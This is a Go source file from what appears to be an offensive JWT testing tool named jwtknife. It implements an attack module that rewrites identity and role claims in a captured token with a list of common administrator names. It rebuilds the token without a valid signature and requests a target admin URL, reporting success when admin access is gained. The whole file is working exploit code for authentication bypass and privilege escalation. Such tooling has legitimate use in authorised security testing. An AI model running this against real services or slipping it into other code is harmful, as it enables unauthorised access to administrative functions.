package jwt

import (
	"strings"

	"jwtknife/internal/httpx"
	"jwtknife/internal/jwtknifejwt"
	"jwtknife/internal/report"
)

type unverifiedSig struct{}

func NewUnverifiedSignatureAttack() Attack { return unverifiedSig{} }

func (unverifiedSig) Name() string {
	return "Unverified JWT signature + claim escalation"
}

var commonAdminValues = []string{
	"administrator",
	"admin",
	"root",
	"superuser",
	"sysadmin",
	"admin@admin.com",
	"admin@example.com",
	"administrator@example.com",
	"root@localhost",
	"admin@localhost",
	"support",
	"support@company.com",
	"it",
	"itadmin",
	"security",
	"security@company.com",
	"ops",
	"devops",
	"owner",
	"ceo",
	"manager",
	"testadmin",
}

var authClaims = []string{
	"sub",
	"username",
	"user",
	"email",
	"role",
}

func (unverifiedSig) Run(in AttackInput) report.AttackResult {
	ar := report.NewAttackResult("unverified-signature")

	// Build candidate admin values
	candidates := []string{}
	if in.Callback != "" {
		candidates = append(candidates, strings.TrimSpace(in.Callback))
	}
	candidates = append(candidates, commonAdminValues...)

	for _, claim := range authClaims {
		if _, ok := in.ParsedJWT.Payload[claim]; !ok {
			continue
		}

		for _, val := range candidates {
			p, err := jwtknifejwt.Parse(in.RawJWT)
			if err != nil {
				ar.Errors = append(ar.Errors, err.Error())
				continue
			}

			p.Payload[claim] = val
			mod, err := jwtknifejwt.Rebuild(p)
			if err != nil {
				ar.Errors = append(ar.Errors, err.Error())
				continue
			}

			r := in.Client.Do(httpx.RequestPlan{
				Label:     "atk-unverified-escalation",
				URL:       in.Targets.AdminURL,
				Method:    "GET",
				JWT:       mod,
				Placement: in.Targets.Placement,
			})

			step := report.Step{
				Label:   "unsigned-claim-escalation",
				Details: claim + "=" + val,
				HTTP:    report.FromHTTPResult(r),
				JWT:     report.JWTInfo{Token: mod},
			}
			ar.Steps = append(ar.Steps, step)

			if report.IsAdminSuccess(in.Baseline, step.HTTP) {
				ar.Outcome = report.OutcomeSuccess
				ar.Note = "admin access via unsigned JWT and claim escalation"
				return ar
			}

			if report.IsInteresting(in.Baseline, step.HTTP) {
				ar.Outcome = report.OutcomeInteresting
			}
		}
	}

	if ar.Outcome == "" {
		ar.Outcome = report.OutcomeNoEffect
	}
	return ar
}
